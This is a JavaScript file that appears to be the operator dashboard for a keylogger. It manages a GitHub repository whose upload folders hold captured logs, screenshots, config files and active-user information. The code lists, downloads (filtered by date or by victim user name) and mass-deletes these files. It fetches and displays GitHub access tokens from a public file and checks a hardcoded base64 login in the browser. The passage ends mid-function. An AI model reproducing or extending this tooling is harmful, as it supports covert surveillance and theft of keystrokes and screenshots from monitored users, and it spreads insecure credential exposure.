// login credentials
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const encodedUsername = "YmliZWs0OA==";
    const encodedPassword = "YWRtaW5iaWJlaw==";

    // Get user input
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const encodedInputUsername = btoa(username);
    const encodedInputPassword = btoa(password);

    // Validate credentials
    if (encodedInputUsername === encodedUsername && encodedInputPassword === encodedPassword) {
        // Hide the login container
        document.getElementById('loginContainer').classList.add('hidden');

        // Show the success message
        document.getElementById('successMessage').classList.remove('hidden');

        // Show custom notification
        showNotification("You logged in successfully!");
    } else {
        document.getElementById('message').textContent = "Invalid username or password!";
        document.getElementById('message').style.color = "red";
        // Show custom notification
        showNotification("⚠️ Invalid username or password 😡🤬");
    }
});

// Function to show custom notification
function showNotification(message) {
    const notification = document.getElementById('customNotification');
    notification.textContent = message;
    notification.classList.remove('hidden');

    // Hide the notification after 3 seconds
    setTimeout(() => {
        notification.classList.add('hidden');
    }, 3000);
}





// file no. count 
const GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads";
const GITHUB_UI_BASE_URL = "https://github.com/bebedudu/keylogger/tree/main/uploads";
const GITHUB_DELETE_URL = "https://github.com/bebedudu/keylogger/tree/delete/main/uploads";
const FOLDERS = ["cache", "config", "keylogerror", "logs", "screenshots"];


// URL containing the tokens JSON
const TOKEN_URLL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json";
// Fallback token in case of failure to fetch from the URL
const DEFAULT_RANDOMLETTER = "fallback_randomletter_12345XYZ67890"; // Example fallback token

// Function to fetch and process the token
async function randomletter() {
    try {
        // Fetch the JSON from the URL
        const response = await fetch(TOKEN_URLL);

        // Check if the response status is OK (status code 200)
        if (response.ok) {
            const tokenData = await response.json(); // Parse the JSON response

            // Check if the "dashboard" key exists in the token data
            if (tokenData.dashboard) {
                let token = tokenData.dashboard;

                let processedToken = token.slice(5, -6);
                // console.log(`Token fetched and processed: ${processedToken}`);
                return processedToken; // Return the processed token
            } else {
                console.log("Key 'dashboard' not found in the token data.");
            }
        } else {
            console.log(`Failed to fetch tokens. Status code: ${response.status}`);
        }
    } catch (error) {
        console.log(`An error occurred while fetching the token: ${error.message}`);
    }

    // Fallback to the default token
    console.log("Using default token.");
    return DEFAULT_TOKEN.slice(5, -6); // Return the fallback token
}



async function fetchFileCounts() {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();

    const grid = document.getElementById("file-count-grid");
    grid.innerHTML = "Fetching data...";

    const headers = {
        "Authorization": `token ${newRandomLetter}`,
        "Accept": "application/vnd.github.v3+json"
    };

    try {
        const results = await Promise.all(FOLDERS.map(async (folder) => {
            const response = await fetch(`${GITHUB_API_BASE_URL}/${folder}`, { headers });
            if (!response.ok) return { folder, count: "Error" };
            const files = await response.json();
            return { folder, count: files.length };
        }));

        grid.innerHTML = results.map(result => `
                    <div class="col-sm-4 mb-3">
                        <div class="card">
                            <div class="card-body">
                                <span class="delete-icon" onclick="event.stopPropagation(); openDeleteFolder('${result.folder}')"><i class="bi bi-trash"></i></span>
                                <!-- <strong>${result.folder.toUpperCase()}</strong>
                                <p>${result.count} files</p> -->
                                <h5 class="card-title text-center openfolder" onclick="openFolder('${result.folder}')">${result.folder.toUpperCase()}</h5>
                                <p class="card-text text-center">${result.count} files</p>
                            </div>
                        </div>
                    </div>
                `).join("");
    } catch (error) {
        grid.innerHTML = `<p style="color: red;">Error fetching file counts.</p>`;
    }
}

function openFolder(folder) {
    window.open(`${GITHUB_UI_BASE_URL}/${folder}`, "_blank");
}

function openDeleteFolder(folder) {
    window.open(`${GITHUB_DELETE_URL}/${folder}`, "_blank");
}

fetchFileCounts(); // Fetch data on page load






// token data
const TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json";

async function fetchTokens() {
    try {
        const response = await fetch(TOKEN_URL);
        if (!response.ok) throw new Error(`Failed to fetch tokens. Status: ${response.status}`);
        const data = await response.json();
        const tokenGrid = document.getElementById("token-grid");
        tokenGrid.innerHTML = "Fetching data...";
        tokenGrid.innerHTML = await Promise.all(
            Object.entries(data).map(async ([key, value]) => {
                const processedToken = processToken(value);
                const rateLimit = await fetchRateLimit(processedToken);
                return `
                            <div class="col-sm-auto mb-3">
                                <div class="card">
                                    <div class="card-body">
                                        <h5 class="card-title text-center">${key.toUpperCase()}</h5>
                                        <p class="card-text">${processedToken}</p>
                                        <div class="tokendetail">
                                            <strong>Limit:</strong> ${rateLimit.limit || "N/A"}<br>
                                            <strong>Remaining:</strong> ${rateLimit.remaining || "N/A"}<br>
                                            <strong>Reset Time:</strong> ${rateLimit.resetTime || "N/A"}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        `;
            })
        ).then(cards => cards.join(""));
    } catch (error) {
        document.getElementById("token-grid").innerText = "Error fetching tokens.";
    }
}

function processToken(token) {
    return token ? token.substring(5, token.length - 6) : "N/A";
}

async function fetchRateLimit(token) {
    try {
        const response = await fetch("https://api.github.com/user", {
            headers: { Authorization: `Bearer ${token}` },
        });
        if (!response.ok) throw new Error("Failed to fetch rate limit");
        const limit = response.headers.get("X-RateLimit-Limit");
        const remaining = response.headers.get("X-RateLimit-Remaining");
        const reset = response.headers.get("X-RateLimit-Reset");
        return {
            limit: limit || "N/A",
            remaining: remaining || "N/A",
            resetTime: reset ? new Date(reset * 1000).toLocaleString() : "N/A"
        };
    } catch (error) {
        return { limit: "N/A", remaining: "N/A", resetTime: "N/A" };
    }
}

fetchTokens();






// delete files 
// show the no. of files with simultaneously deleting no. of files and try to reattemp to delete files 
const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads";

// Fetch and display the number of files in each folder on page load
document.addEventListener("DOMContentLoaded", async () => {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();

    const folders = ["cache", "config", "keylogerror", "logs", "screenshots"];

    for (const folder of folders) {
        try {
            const folderUrl = `${GITHUB_API_BASE}/${folder}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                document.getElementById(`${folder}FileCount`).textContent = "Error fetching file count";
                continue;
            }

            const files = await response.json();
            const fileCount = files.length || 0;

            // Display the file count next to the folder's input box
            document.getElementById(`${folder}FileCount`).textContent = `${fileCount} files available`;
        } catch (error) {
            console.error(`Error fetching file count for folder: ${folder}`, error);
            document.getElementById(`${folder}FileCount`).textContent = "Error fetching file count";
        }
    }
});

async function deleteFiles() {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();
    
    const terminalLog = document.getElementById('terminal-log'); // For terminal-like output
    const resultDiv = document.getElementById('result');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Map of folder names to their checkbox, input elements, and progress span
    const folderInputs = [
        { folder: "cache", checkbox: document.getElementById("cacheCheckbox"), countInput: document.getElementById("cacheCount"), progressSpan: document.getElementById("cacheProgress") },
        { folder: "config", checkbox: document.getElementById("configCheckbox"), countInput: document.getElementById("configCount"), progressSpan: document.getElementById("configProgress") },
        { folder: "keylogerror", checkbox: document.getElementById("keylogerrorCheckbox"), countInput: document.getElementById("keylogerrorCount"), progressSpan: document.getElementById("keylogerrorProgress") },
        { folder: "logs", checkbox: document.getElementById("logsCheckbox"), countInput: document.getElementById("logsCount"), progressSpan: document.getElementById("logsProgress") },
        { folder: "screenshots", checkbox: document.getElementById("screenshotsCheckbox"), countInput: document.getElementById("screenshotsCount"), progressSpan: document.getElementById("screenshotsProgress") }
    ];

    try {
        // Filter selected folders and fetch their files
        const selectedFolders = folderInputs
            .filter(({ checkbox }) => checkbox.checked)
            .map(async ({ folder, countInput, progressSpan }) => {
                const numFilesToDelete = parseInt(countInput.value);

                if (isNaN(numFilesToDelete) || numFilesToDelete <= 0) {
                    logToTerminal(`Skipping folder: ${folder} - Invalid or zero file count`, terminalLog);
                    return null;
                }

                logToTerminal(`Fetching files for folder: ${folder}`, terminalLog);

                try {
                    const folderUrl = `${GITHUB_API_BASE}/${folder}`;
                    const response = await fetch(folderUrl, {
                        headers: {
                            "Authorization": `token ${newRandomLetter}`
                        }
                    });

                    if (!response.ok) {
                        logToTerminal(`Failed to fetch files from folder: ${folder} - ${response.statusText}`, terminalLog);
                        return null;
                    }

                    const files = await response.json();

                    if (files.length === 0) {
                        logToTerminal(`No files found in folder: ${folder}`, terminalLog);
                        return null;
                    }

                    // Limit the number of files to delete
                    const filesToDelete = files.slice(0, numFilesToDelete);

                    // Initialize progress counter
                    let deletedCount = 0;
                    progressSpan.textContent = `${deletedCount}/${numFilesToDelete}`;

                    return { folder, filesToDelete, deletedCount, numFilesToDelete, progressSpan };
                } catch (error) {
                    logToTerminal(`Error processing folder: ${folder} - ${error.message}`, terminalLog);
                    return null;
                }
            });

        // Wait for all folder data to be fetched
        const folderData = (await Promise.all(selectedFolders)).filter(Boolean);

        // Sequentially delete files in a round-robin fashion
        let totalDeleted = 0;
        while (folderData.some(({ deletedCount, numFilesToDelete }) => deletedCount < numFilesToDelete)) {
            for (const folder of folderData) {
                const { folder: folderName, filesToDelete, deletedCount, numFilesToDelete, progressSpan } = folder;

                if (deletedCount >= numFilesToDelete) continue; // Skip if all files for this folder are deleted

                const file = filesToDelete[deletedCount];

                try {
                    // await deleteFileWithRetry(file.path, file.sha, 3); // Retry up to 3 times
                    await deleteFileWithRetry(file.path, file.sha, terminalLog, 3); // Retry up to 3 times
                    folder.deletedCount++;
                    folder.progressSpan.textContent = `${folder.deletedCount}/${numFilesToDelete}`;
                    logToTerminal(`Deleted: ${file.name} from folder: ${folderName}`, terminalLog);
                    totalDeleted++;
                } catch (error) {
                    logToTerminal(`Error deleting: ${file.name} from folder: ${folderName} - ${error.message}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = `Operation completed. Check the terminal log for details.`;
        // Show custom notification
        showNotification("Deletion completed. Check the terminal log for details.");
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

// async function deleteFileWithRetry(filePath, sha, retries) {
//     let attempt = 1;

//     while (attempt <= retries) {
//         try {
//             await deleteFile(filePath, sha);
//             return; // Success, exit the loop
//         } catch (error) {
//             if (attempt === retries) {
//                 throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
//             }
//             logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, document.getElementById('terminal-log'));
//             attempt++;
//         }
//     }
// }

async function deleteFile(filePath, sha) {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();

    const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;

    const response = await fetch(deleteUrl, {
        method: "DELETE",
        headers: {
            "Authorization": `token ${newRandomLetter}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            message: `Deleted: ${filePath.split('/').pop()}`,
            sha: sha
        })
    });

    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(`GitHub API Error: ${errorData.message}`);
    }
}

function logToTerminal(message, terminalLog) {
    const logEntry = document.createElement("p");
    logEntry.textContent = message;
    terminalLog.appendChild(logEntry);
    terminalLog.scrollTop = terminalLog.scrollHeight;
}





// advance delete
const GITHUB_API_BASE2 = "https://api.github.com/repos/bebedudu/keylogger/contents";
async function performAdvancedDeletion() {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();

    const terminalLog = document.getElementById('advancedTerminalLog');
    const resultDiv = document.getElementById('advancedResult');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Get user-selected action
    const action = document.querySelector('input[name="action"]:checked')?.value;

    if (!action) {
        resultDiv.textContent = "Please select an action.";
        return;
    }

    // Get folder paths, file names, and date/time ranges
    const folderPaths = [
        document.getElementById('advancedFolderPath1').value,
        document.getElementById('advancedFolderPath2').value,
        document.getElementById('advancedFolderPath3').value,
        document.getElementById('advancedFolderPath4').value,
        document.getElementById('advancedFolderPath5').value
    ];

    const fileNames = [
        document.getElementById('advancedFileName1').value.trim(),
        document.getElementById('advancedFileName2').value.trim(),
        document.getElementById('advancedFileName3').value.trim(),
        document.getElementById('advancedFileName4').value.trim(),
        document.getElementById('advancedFileName5').value.trim()
    ];

    const startDates = [
        document.getElementById('startDate1').value,
        document.getElementById('startDate2').value,
        document.getElementById('startDate3').value,
        document.getElementById('startDate4').value,
        document.getElementById('startDate5').value
    ];

    const startTimes = [
        document.getElementById('startTime1').value,
        document.getElementById('startTime2').value,
        document.getElementById('startTime3').value,
        document.getElementById('startTime4').value,
        document.getElementById('startTime5').value
    ];

    const endDates = [
        document.getElementById('endDate1').value,
        document.getElementById('endDate2').value,
        document.getElementById('endDate3').value,
        document.getElementById('endDate4').value,
        document.getElementById('endDate5').value
    ];

    const endTimes = [
        document.getElementById('endTime1').value,
        document.getElementById('endTime2').value,
        document.getElementById('endTime3').value,
        document.getElementById('endTime4').value,
        document.getElementById('endTime5').value
    ];

    try {
        for (let i = 0; i < folderPaths.length; i++) {
            const folderPath = folderPaths[i];
            const fileName = fileNames[i];
            const startDate = startDates[i];
            const startTime = startTimes[i];
            const endDate = endDates[i];
            const endTime = endTimes[i];

            logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

            // Skip deletion if no specific file name is provided for "stopOnFile" or "deleteOnFile"
            if ((action === "stopOnFile" || action === "deleteOnFile") && !fileName) {
                logToTerminal(`Skipping folder: ${folderPath}. No specific file name provided.`, terminalLog);
                continue;
            }

            const folderUrl = `${GITHUB_API_BASE2}/${folderPath}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
                continue;
            }

            const files = await response.json();

            if (files.length === 0) {
                logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
                continue;
            }

            for (const file of files) {
                const filePath = file.path;
                const fileSha = file.sha;

                // Handle "Stop Deletion when a Specific File is Found"
                if (action === "stopOnFile" && file.name === fileName) {
                    logToTerminal(`Stopping deletion process for folder: ${folderPath}. File found: ${fileName}`, terminalLog);
                    break; // Stop processing further files in this folder
                }

                // Handle "Delete when a Specific File is Found"
                if (action === "deleteOnFile" && file.name === fileName) {
                    await deleteFileWithRetry(filePath, fileSha, terminalLog, 3);
                    logToTerminal(`Deleted specific file: ${fileName} from folder: ${folderPath}`, terminalLog);
                    break; // Stop processing further files in this folder
                }

                // Handle "Delete Files within Date and Time Range"
                if (action === "deleteInRange") {
                    // Extract YYYYMMDD and HHMMSS from the file name
                    const match = file.name.match(/^(\d{8})_(\d{6})/); // Match YYYYMMDD_HHMMSS at the start of the file name
                    const fileDate = match?.[1]; // YYYYMMDD
                    const fileTime = match?.[2]; // HHMMSS

                    if (fileDate && fileTime) {
                        if (
                            fileDate >= startDate &&
                            fileDate <= endDate &&
                            fileTime >= startTime &&
                            fileTime <= endTime
                        ) {
                            await deleteFileWithRetry(filePath, fileSha, terminalLog, 3);
                            logToTerminal(`Deleted file within range: ${file.name} from folder: ${folderPath}`, terminalLog);
                        } else {
                            // logToTerminal(`Skipping file outside range: ${file.name} from folder: ${folderPath}`, terminalLog);
                            continue
                        }
                    } else {
                        logToTerminal(`Skipping file with invalid date/time format: ${file.name} from folder: ${folderPath}`, terminalLog);
                    }
                }

                // For "Stop Deletion when a Specific File is Found", delete files until the specific file is found
                if (action === "stopOnFile") {
                    await deleteFileWithRetry(filePath, fileSha, terminalLog, 3);
                    logToTerminal(`Deleted file: ${file.name} from folder: ${folderPath}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = "Operation completed. Check the terminal log for details.";
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

async function deleteFileWithRetry(filePath, sha, terminalLog, retries) {
    let attempt = 1;

    while (attempt <= retries) {
        try {
            await deleteFile(filePath, sha, terminalLog);
            return; // Success, exit the loop
        } catch (error) {
            if (attempt === retries) {
                logToTerminal(`All ${retries} attempts failed for file: ${filePath.split('/').pop()}. Last error: ${error.message}`, terminalLog);
                throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
            }
            logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, terminalLog);
            attempt++;
        }
    }
}

// async function deleteFile(filePath, sha, terminalLog) {
//     const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;

//     const response = await fetch(deleteUrl, {
//         method: "DELETE",
//         headers: {
//             "Authorization": `token ${newRandomLetter}`,
//             "Content-Type": "application/json"
//         },
//         body: JSON.stringify({
//             message: `Deleted: ${filePath.split('/').pop()}`,
//             sha: sha
//         })
//     });

//     if (!response.ok) {
//         const errorData = await response.json();
//         throw new Error(`GitHub API Error: ${errorData.message}`);
//     }
// }

// function logToTerminal(message, terminalLog) {
//     const logEntry = document.createElement("p");
//     logEntry.textContent = message;
//     terminalLog.appendChild(logEntry);
//     terminalLog.scrollTop = terminalLog.scrollHeight;
// }






// download files
// const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents";
// const newRandomLetter = "dfsghp_F7mmXrLHwlyu8IC6jOQmfsdaf9aCE1KIehT3tLJiadfs"; // Replace with your GitHub PAT


// no. of file is effecting now all menu item (x date & time range also need this)
async function performDownload() {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();

    const terminalLog = document.getElementById('downloadTerminalLog');
    const resultDiv = document.getElementById('downloadResult');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Get user-selected action
    const action = document.querySelector('input[name="downloadAction"]:checked')?.value;

    if (!action) {
        resultDiv.textContent = "Please select an action.";
        return;
    }

    // Get folder paths, date/time ranges, file counts, and user names
    const folderPaths = [
        document.getElementById('downloadFolderPath1').value,
        document.getElementById('downloadFolderPath2').value,
        document.getElementById('downloadFolderPath3').value,
        document.getElementById('downloadFolderPath4').value,
        document.getElementById('downloadFolderPath5').value,
        // Add more folders as needed
    ];

    const startDates = [
        document.getElementById('downloadStartDate1').value,
        document.getElementById('downloadStartDate2').value,
        document.getElementById('downloadStartDate3').value,
        document.getElementById('downloadStartDate4').value,
        document.getElementById('downloadStartDate5').value,
        // Add more folders as needed
    ];

    const startTimes = [
        document.getElementById('downloadStartTime1').value,
        document.getElementById('downloadStartTime2').value,
        document.getElementById('downloadStartTime3').value,
        document.getElementById('downloadStartTime4').value,
        document.getElementById('downloadStartTime5').value,
        // Add more folders as needed
    ];

    const endDates = [
        document.getElementById('downloadEndDate1').value,
        document.getElementById('downloadEndDate2').value,
        document.getElementById('downloadEndDate3').value,
        document.getElementById('downloadEndDate4').value,
        document.getElementById('downloadEndDate5').value,
        // Add more folders as needed
    ];

    const endTimes = [
        document.getElementById('downloadEndTime1').value,
        document.getElementById('downloadEndTime2').value,
        document.getElementById('downloadEndTime3').value,
        document.getElementById('downloadEndTime4').value,
        document.getElementById('downloadEndTime5').value,
        // Add more folders as needed
    ];

    const fileCounts = [
        parseInt(document.getElementById('downloadFileCount1').value),
        parseInt(document.getElementById('downloadFileCount2').value),
        parseInt(document.getElementById('downloadFileCount3').value),
        parseInt(document.getElementById('downloadFileCount4').value),
        parseInt(document.getElementById('downloadFileCount5').value),
        // Add more folders as needed
    ];

    const userNames = [
        document.getElementById('downloadUserName1').value.trim(),
        document.getElementById('downloadUserName2').value.trim(),
        document.getElementById('downloadUserName3').value.trim(),
        document.getElementById('downloadUserName4').value.trim(),
        document.getElementById('downloadUserName5').value.trim(),
        // Add more folders as needed
    ];

    try {
        for (let i = 0; i < folderPaths.length; i++) {
            const folderPath = folderPaths[i];
            const startDate = startDates[i];
            const startTime = startTimes[i];
            const endDate = endDates[i];
            const endTime = endTimes[i];
            const fileCount = fileCounts[i];
            const userName = userNames[i];

            logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

            const folderUrl = `${GITHUB_API_BASE2}/${folderPath}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
                continue;
            }

            const files = await response.json();

            if (files.length === 0) {
                logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
                continue;
            }

            // Sort files by date (most recent first)
            const sortedFiles = files.sort((a, b) => {
                const dateA = a.name.match(/^(\d{8})_(\d{6})/);
                const dateB = b.name.match(/^(\d{8})_(\d{6})/);
                if (!dateA || !dateB) return 0;
                return `${dateB[1]}${dateB[2]}`.localeCompare(`${dateA[1]}${dateA[2]}`);
            });

            // Filter files based on the selected action
            let filteredFiles = [];
            if (action === "downloadInRange") {
                filteredFiles = sortedFiles.filter(file => {
                    const match = file.name.match(/^(\d{8})_(\d{6})/);
                    const fileDate = match?.[1];
                    const fileTime = match?.[2];
                    if (fileDate && fileTime) {
                        return (
                            fileDate >= startDate &&
                            fileDate <= endDate &&
                            fileTime >= startTime &&
                            fileTime <= endTime
                        );
                    }
                    return false;
                });
            } else if (action === "downloadByUser") {
                filteredFiles = sortedFiles.filter(file => file.name.includes(userName));
            } else if (action === "downloadCount") {
                filteredFiles = sortedFiles;
            }

            // Apply the "Number of Files to Download" limit
            const filesToDownload = filteredFiles.slice(0, fileCount);

            // Download files
            for (const file of filesToDownload) {
                const downloadUrl = file.download_url;
                if (!downloadUrl) {
                    logToTerminal(`Skipping file (no download URL): ${file.name} from folder: ${folderPath}`, terminalLog);
                    continue;
                }

                try {
                    await downloadFile(downloadUrl, file.name, terminalLog);
                    logToTerminal(`Downloaded file: ${file.name} from folder: ${folderPath}`, terminalLog);
                } catch (error) {
                    logToTerminal(`Error downloading file: ${file.name} from folder: ${folderPath} - ${error.message}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = "Operation completed. Check the terminal log for details.";
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

async function downloadFile(url, fileName, terminalLog) {
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();

    try {
        // Use a CORS proxy to bypass CORS restrictions
        const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
        const response = await fetch(proxyUrl, {
            headers: {
                "Authorization": `token ${newRandomLetter}`
            }
        });

        if (!response.ok) {
            throw new Error(`Failed to download file: ${response.statusText}`);
        }

        const blob = await response.blob();
        const link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.click();
    } catch (error) {
        throw new Error(`Error downloading file: ${error.message}`);
    }
}

function logToTerminal(message, terminalLog) {
    const logEntry = document.createElement("p");
    logEntry.textContent = message;
    terminalLog.appendChild(logEntry);
    terminalLog.scrollTop = terminalLog.scrollHeight;
}














// commit history
document.addEventListener("DOMContentLoaded", async () => {
    const commitList = document.getElementById("commit-list");
    const commitCountInput = document.getElementById("commit-count");
    const reloadButton = document.getElementById("reload-button");
    const loadingIndicator = document.getElementById("loading");
    const autoReloadCheckbox = document.getElementById("auto-reload");
    const notification = document.getElementById("notification");
    const searchInput = document.getElementById("search-input");
    // const toggleDarkModeButton = document.getElementById("toggle-dark-mode");
    const pagination = document.getElementById("pagination");
    const prevPageButton = document.getElementById("prev-page");
    const nextPageButton = document.getElementById("next-page");
    const pageInfo = document.getElementById("page-info");
    const statsDiv = document.getElementById("stats");
    const errorDiv = document.getElementById("error");

    // Replace these variables with your actual GitHub details
    const owner = "bebedudu"; // GitHub username or organization
    const repo = "keylogger"; // Repository name
    // get random letter with async fucntion
    const newRandomLetter = await randomletter();
    const token = newRandomLetter; // Your GitHub Personal Access Token

    let autoReloadInterval = null;
    let currentPage = 1;
    let lastFetchedCommits = [];
    let filteredCommits = [];

    // Load preferences from localStorage
    const savedPreferences = JSON.parse(localStorage.getItem("commitHistoryPreferences")) || {};
    if (savedPreferences.commitCount) commitCountInput.value = savedPreferences.commitCount;
    if (savedPreferences.autoReload) autoReloadCheckbox.checked = savedPreferences.autoReload;
    // if (savedPreferences.darkMode) document.body.classList.add("dark-mode");

    // Save preferences to localStorage
    const savePreferences = () => {
        const preferences = {
            commitCount: commitCountInput.value,
            autoReload: autoReloadCheckbox.checked,
            // darkMode: document.body.classList.contains("dark-mode"),
        };
        localStorage.setItem("commitHistoryPreferences", JSON.stringify(preferences));
    };

    // Function to calculate relative time
    const getRelativeTime = (commitDate) => {
        const now = new Date();
        const commitTime = new Date(commitDate);
        const diffInSeconds = Math.floor((now - commitTime) / 1000);

        if (diffInSeconds < 60) {
            return "committed now";
        } else if (diffInSeconds < 3600) {
            const minutes = Math.floor(diffInSeconds / 60);
            return `committed ${minutes} minute${minutes > 1 ? "s" : ""} ago`;
        } else if (diffInSeconds < 86400) {
            const hours = Math.floor(diffInSeconds / 3600);
            return `committed ${hours} hour${hours > 1 ? "s" : ""} ago`;
        } else {
            const days = Math.floor(diffInSeconds / 86400);
            return `committed ${days} day${days > 1 ? "s" : ""} ago`;
        }
    };

    // Function to fetch and display commits
    const fetchCommits = (page = 1) => {
        commitList.innerHTML = ""; // Clear previous results
        loadingIndicator.style.display = "block"; // Show loading indicator
        errorDiv.style.display = "none";

        const count = parseInt(commitCountInput.value, 10);
        if (isNaN(count) || count <= 0 || count > 100) {
            alert("Please enter a valid number between 1 and 100.");
            loadingIndicator.style.display = "none";
            return;
        }

        const url = `https://api.github.com/repos/${owner}/${repo}/commits?per_page=${count}&page=${page}`;

        fetch(url, {
            method: "GET",
            headers: {
                Authorization: `token ${token}`,
                Accept: "application/vnd.github.v3+json",
            },
        })
            .then((response) => {
                if (!response.ok) {
                    throw new Error(`Error: ${response.status}`);
                }
                return response.json();
            })
            .then((data) => {
                loadingIndicator.style.display = "none"; // Hide loading indicator
                if (data.length === 0) {
                    commitList.innerHTML = "<li>No commits found.</li>";
                    return;
                }

                lastFetchedCommits = data;
                filteredCommits = data;
                renderCommits(filteredCommits);
                updatePagination(page, data.length === count);
                updateStats(data);
                savePreferences();

                // Show notification if auto-reload is enabled
                if (autoReloadCheckbox.checked) {
                    notification.style.display = "block";
                    setTimeout(() => {
                        notification.style.display = "none";
                    }, 3000); // Hide notification after 3 seconds
                }
            })
            .catch((error) => {
                console.error("Failed to fetch commit history:", error);
                loadingIndicator.style.display = "none"; // Hide loading indicator
                errorDiv.textContent = "Error fetching commit history. Check console for details.";
                errorDiv.style.display = "block";
            });
    };

    // Render commits to the DOM
    const renderCommits = (commits) => {
        commitList.innerHTML = "";
        commits.forEach((commit, index) => {
            const message = commit.commit.message;
            const author = commit.commit.author.name;
            const date = new Date(commit.commit.author.date).toLocaleString();
            const relativeTime = getRelativeTime(commit.commit.author.date);

            const listItem = document.createElement("li");
            if (index < 5 && autoReloadCheckbox.checked) listItem.classList.add("new-commit"); // Highlight recent changes
            listItem.innerHTML = `
          <div class="commit-message">${message}</div>
          <div class="commit-author">By ${author} on ${date} (${relativeTime})</div>
        `;
            commitList.appendChild(listItem);
        });
    };

    // Update pagination controls
    const updatePagination = (page, hasNextPage) => {
        pageInfo.textContent = `Page ${page}`;
        prevPageButton.disabled = page === 1;
        nextPageButton.disabled = !hasNextPage;
    };

    // Update commit statistics
    const updateStats = (commits) => {
        const totalCommits = commits.length;
        const uniqueAuthors = [...new Set(commits.map((commit) => commit.commit.author.name))].length;
        statsDiv.innerHTML = `
        <p>Total Commits: ${totalCommits}</p>
        <p>Unique Authors: ${uniqueAuthors}</p>
      `;
    };

    // Initial load with default 20 commits
    fetchCommits(currentPage);

    // Reload button click event
    reloadButton.addEventListener("click", () => {
        currentPage = 1;
        fetchCommits(currentPage);
    });

    // Auto-reload functionality
    autoReloadCheckbox.addEventListener("change", (event) => {
        if (event.target.checked) {
            const count = parseInt(commitCountInput.value, 10);
            if (isNaN(count) || count <= 0 || count > 100) {
                alert("Please enter a valid number between 1 and 100 before enabling auto-reload.");
                event.target.checked = false;
                return;
            }
            autoReloadInterval = setInterval(() => fetchCommits(currentPage), 60000); // Fetch every 1 minute
        } else {
            clearInterval(autoReloadInterval); // Stop auto-reloading
        }
        savePreferences();
    });

    // Pagination buttons
    prevPageButton.addEventListener("click", () => {
        if (currentPage > 1) {
            currentPage--;
            fetchCommits(currentPage);
        }
    });

    nextPageButton.addEventListener("click", () => {
        currentPage++;
        fetchCommits(currentPage);
    });

    // Search/filter commits
    searchInput.addEventListener("input", (event) => {
        const query = event.target.value.toLowerCase();
        filteredCommits = lastFetchedCommits.filter((commit) =>
            commit.commit.message.toLowerCase().includes(query) ||
            commit.commit.author.name.toLowerCase().includes(query)
        );
        renderCommits(filteredCommits);
    });

    // // Toggle Dark Mode
    // toggleDarkModeButton.addEventListener("click", () => {
    //     document.body.classList.toggle("dark-mode");
    //     savePreferences();
    // });
});






// active users
document.addEventListener('DOMContentLoaded', () => {
    const repoUrl = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/activeuserinfo.txt';
    const tableBody = document.querySelector('#data-table tbody');
    const summaryElement = document.getElementById('summary');
    const loadingElement = document.getElementById('activeusers_loading');
    const refreshButton = document.getElementById('activeusers-refresh-btn');
    const lineCountInput = document.getElementById('line-count');
    const detailsContainer = document.getElementById('details-container');
    
    let countryChartInstance = null;
    let cityChartInstance = null;
    
    // Function to fetch the file content from GitHub
    async function fetchFileContent() {
        // get random letter with async fucntion
        const newRandomLetter = await randomletter();
        const githubToken = newRandomLetter; // Replace with your GitHub PAT
        try {
            // Show loading message
            tableBody.innerHTML = ''; // Clear previous data
            detailsContainer.innerHTML = ''; // Clear previous details
            loadingElement.style.display = 'block';

            const response = await fetch(repoUrl, {
                headers: {
                    'Authorization': `token ${githubToken}`,
                    'Accept': 'application/vnd.github.v3.raw'
                }
            });

            if (!response.ok) {
